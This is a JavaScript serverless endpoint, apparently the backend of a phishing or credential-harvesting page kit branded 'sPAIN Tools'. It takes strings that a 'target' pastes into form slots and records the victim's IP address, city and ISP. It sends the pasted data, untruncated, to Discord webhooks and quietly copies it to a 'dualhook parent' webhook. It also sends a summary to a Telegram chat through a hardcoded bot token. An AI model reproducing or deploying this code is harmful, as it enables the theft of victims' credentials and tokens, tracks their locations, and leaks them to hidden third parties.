// api/submit.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';

async function redisGet(key) {
  const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });
  const json = await res.json();
  if (!json.result) return null;
  try { return JSON.parse(json.result); } catch { return null; }
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,isp,query`);
    if (!res.ok) return null;
    const data = await res.json();
    return data.status === 'success' ? data : null;
  } catch (_) { return null; }
}

async function sendToWebhook(webhookUrl, { filledSlots, ip, geo, now, displayName, slug }) {
  if (!webhookUrl?.includes('discord.com/api/webhooks') &&
      !webhookUrl?.includes('discordapp.com/api/webhooks')) return;

  // Embed with slot values + IP/location
  const embedFields = filledSlots.map(([k, v]) => ({
    name: `Slot ${k.replace('slot', '')}`,
    value: v.length > 1020 ? v.substring(0, 1020) + '...' : v,
    inline: false
  }));
  embedFields.push(
    { name: '\u{1F310} IP',       value: ip || 'Unknown',                                inline: true },
    { name: '\u{1F4CD} Location', value: `${geo?.city||'?'}, ${geo?.country||'?'}`,      inline: true },
    { name: '\u{1F5FA} ISP',      value: geo?.isp || 'Unknown',                          inline: true },
    { name: '\u{1F550} Time',     value: now,                                             inline: false }
  );

  await fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      content: '@everyone',
      embeds: [{
        title: `\u{1F4E5} New Submission — ${displayName}`,
        color: 0xc026d3,
        fields: embedFields,
        footer: { text: `sPAIN Tools • ${slug}` },
        timestamp: now
      }]
    })
  }).catch(() => {});

  // Send each slot value as raw plain text messages — zero truncation, zero modification
  // This is the EXACT string the target pasted, nothing touched
  for (const [, v] of filledSlots) {
    let remaining = v;
    while (remaining.length > 0) {
      const chunk = remaining.substring(0, 1990);
      remaining = remaining.substring(1990);
      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: chunk })
      }).catch(() => {});
    }
  }
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
  }

  const { slug, slots } = body || {};
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  let record;
  try { record = await redisGet(`slot:${slug}`); }
  catch (err) { return res.status(500).json({ error: 'Redis error', detail: err.message }); }
  if (!record)         return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });

  const ip  = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
           || req.headers['x-real-ip']
           || req.socket?.remoteAddress
           || 'Unknown';
  const geo = await getIpGeo(ip);
  const now = new Date().toISOString();

  const filledSlots = Object.entries(slots).filter(([, v]) => v && v.trim().length > 0);
  const ctx = { filledSlots, ip, geo, now, displayName: record.displayName, slug };

  // Send to page's own webhook
  await sendToWebhook(record.webhook, ctx);

  // Send to dualhook parent webhook if applicable
  if (record.dualhookParent) {
    try {
      const parent = await redisGet(`slot:${record.dualhookParent}`);
      if (parent?.webhook && parent.webhook !== record.webhook) {
        await sendToWebhook(parent.webhook, ctx);
      }
    } catch (_) {}
  }

  // Telegram log
  await tgSend([
    `\u{1F6A8} <b>NEW SUBMISSION</b>`,
    `\u{1F4C4} Page: <code>${slug}</code> (${record.displayName})`,
    `\u{1F310} IP: ${ip}`,
    `\u{1F4CD} ${geo?.city||'?'}, ${geo?.country||'?'}`,
    `\u{1F550} ${now}`,
    ``,
    ...filledSlots.map(([k, v]) => `Slot ${k.replace('slot','')}: ${v.substring(0, 300)}`)
  ].join('\n'));

  return res.status(200).json({ success: true });
}
